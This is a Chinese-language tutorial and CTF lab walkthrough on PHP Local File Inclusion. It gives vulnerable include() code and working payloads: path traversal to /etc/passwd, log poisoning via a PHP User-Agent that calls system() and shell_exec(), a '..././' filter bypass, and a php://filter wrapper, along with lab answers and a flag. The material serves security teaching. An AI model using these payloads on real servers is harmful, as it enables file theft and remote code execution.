# 本地文件包含 (LFI)

本地文件包含 (LFI) 漏洞允许攻击者包含一个文件。该漏洞源于对用户输入的无效验证，这在许多情况下可能导致远程代码执行 (RCE)。

## 示例

想象以下 PHP 代码，它包含一个文件，执行被包含文件中的所有 PHP 代码，并输出文件内容。

```php
<?php 
$page = isset($_GET["page"]) ? $_GET["page"] : "default.php"; 
$file = include("./includes/" . $page); 
echo $file; 
?>
```

默认文件 `default.php` 包含以下 PHP 代码，仅打印当前日期。

```php
<?php echo "The current date is : " . date("Y/m/d"); ?>
```

攻击者可以控制名为 `page` 的 GET 参数，该参数在 `include(...)` 函数中使用。如果用户未提供 `page` 参数，PHP 代码将包含文件 `default.php`。通过包含可选文件，我们不仅可以检索文件的内容，还会执行我们在指定文件中提供的任何 PHP 代码。作为证明，我们将从目标读取一个文件开始。

如果我们将值 `../../../../../../etc/passwd` 设置为 GET 参数 `page`，我们将能够看到文件 `/etc/passwd` 的内容（如果我们的目标运行的是 Unix 系统）。如果成功，结果应如下所示：

```text
root:x:0:0:root:/root:/bin/bash
...
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

请记住，如果此文件包含任何 PHP 代码，该代码将被执行。如果我们可以将文件上传到服务器，然后在 GET 参数 `page` 中指定上传文件的路径，这将允许我们进行 PHP 代码注入。

我们可能无法每次都上传自己的文件，在这种情况下，我们可以利用一个已知文件，修改并用我们的有效载荷（PHP 代码）感染它。一个很好的例子是日志文件，假设此应用程序使用像 Apache 这样的代理。通过用 PHP 代码感染日志文件，然后在 GET 参数 `page` 中包含被感染的日志文件，我们可以实现 PHP 代码注入。

Apache 的默认日志文件为：`/var/log/apache/access.log`，并且 Apache 默认会记录客户端的 User-Agent 头。我们可以向应用程序发送一个 HTTP 请求，其 User-Agent 包含我们的有效载荷作为其值：`<?php echo system('id'); ?>`，类似于以下原始 HTTP 数据：

```http
GET / HTTP/1.1
Host: target.com
User-Agent: <?php echo system('id'); ?>
```

为了触发被感染的 PHP 代码，我们现在通过在 GET 参数 `page` 中包含包含恶意 PHP 代码的 Apache 日志文件来利用 LFI 漏洞，如下所示：

```http
GET /?page=../../../../../../var/log/apache/access.log HTTP/1.1
Host: target.com
```

应用程序的响应现在将给出我们之前感染在 User-Agent 头中的已执行 PHP 代码（我们的有效载荷）的结果。

```text
uid=0(www-data) gid=0(www-data) groups=0(www-data)
```

### Arbitrary file read through basic Local File Inclusion 

Include a file that allows you to read it. The flag is a step outside the `pages` folder.

code

```php
<?php

$page = urldecode("§输入§");

if (strlen($page) == 0 ) {
    $page = "default.php";
}

$file = include("pages/" . $page);
echo $file;

?>
```

setup code

```php
chdir("/tmp/");

// Add the flag to a file
// `/tmp/flag.txt`
$flagFile = fopen("flag.txt", "w");
fwrite($flagFile, $flag);
fclose($flagFile);


//Make a default dummy php file
// `/tmp/pages`
mkdir("pages");

// `/tmp/pages/default.php`
$defaultPage = fopen("pages/default.php", "w");
fwrite($defaultPage, '<?="<b>This is the home page!</b>"?>');
fclose($defaultPage);
```

输入
```php
$page = urldecode("..%2Fflag.txt");
```
- 向上回溯1层即到达目标文件所在目录

### Local File Inclusion with insecure filter 

Local File Inclusion with insecure filter

感染并包含日志文件 `data.log`，以便在目标应用程序上执行 PHP 代码并实现远程代码执行（RCE）。

Goal
- 读取易受攻击应用程序的环境变量中的标志。

setup code

```php
// Add flag as an enviroment variable
chdir("/tmp");
putenv("FLAG=$flag");


// Make folder and a dummy index.php file
// `/tmp/default/php`
mkdir("default/php", 0777, true);

// `/tmp/default/php/default.php`
$defaultPage = fopen("default/php/default.php", "w");
fwrite($defaultPage, "<h1>Home page</h1>\n<p>The current date is : <?= Date('Y/m/d') ?></p>");
fclose($defaultPage); 

```

code

```php
<?php
// Make a log file in the tmp folder of the system
mkdir("logs");
$logFile = fopen("logs/data.log", "w");

$page = urldecode("§输入§");
$user_agent = urldecode("§输入 用户代理头部§");

// Write User-Agent to log file
fwrite($logFile, "Requested page by user agent: " . $user_agent);

if ( strlen($page) > 0 ) {
    $page = str_replace("../", "", $page);
} else {
    $page = "default.php";
}

include("default/php/" . $page);

fclose($logFile);
?>
```

输入
- 测试载荷
    ```
    # input 使用冗余遍历序列，移除后拼接为有效载荷
    ..././..././logs/data.log

    # 调用 php 命令执行函数
    <?php
    $cmd = 'ls -al';
    echo '<hr><pre>$ ' . $cmd . "\n" . shell_exec($cmd) . '</pre><hr>';
    ?>
    ```

    - 输出
        ```log
        Requested page by user agent:

        $ ls -al
        total 16
        drwxrwxrwt    4 root     root          4096 Oct 13 05:54 .
        drwxr-xr-x   11 root     root          4096 Oct 13 05:54 ..
        drwxr-xr-x    3 nobody   nobody        4096 Oct 13 05:54 default
        drwxr-xr-x    2 nobody   nobody        4096 Oct 13 05:54 logs
        ```

- 从环境变量读取 FLAG
    ```
    <?php
    $cmd = 'env | grep "FLAG{"';
    echo '<hr><pre>$ ' . $cmd . "\n" . shell_exec($cmd) . '</pre><hr>';
    ?>
    ```
    - 输出
        ```log
        Requested page by user agent:

        $ env | grep "FLAG{"
        FLAG=FLAG{W34k_F1lt3r_Byp4ss}
        ```

### Local file inclusion to arbitrary file read with PHP wrappers 

使用 PHP 封装实现本地文件包含 

通过利用 PHP 内置的封装功能，可以执行本地文件包含操作。虽然仍可使用标准方法读取文件，但为了学习目的，了解 PHP 支持可用于绕过过滤器和/或 Web 应用防火墙（WAF）的封装技术是很有帮助的。

setup code
```php
chdir("/tmp/");

// Add flag to a file in the current folder
$flagFile = fopen("flag.txt", "w");
fwrite($flagFile, $flag);
fclose($flagFile);
```

code
```php
<?php

//x
// Use PHP Wrappers!
$file = urldecode("§输入§");
include($file);

?>
```

```
php://filter/convert.base64-encode/resource=flag.txt
```
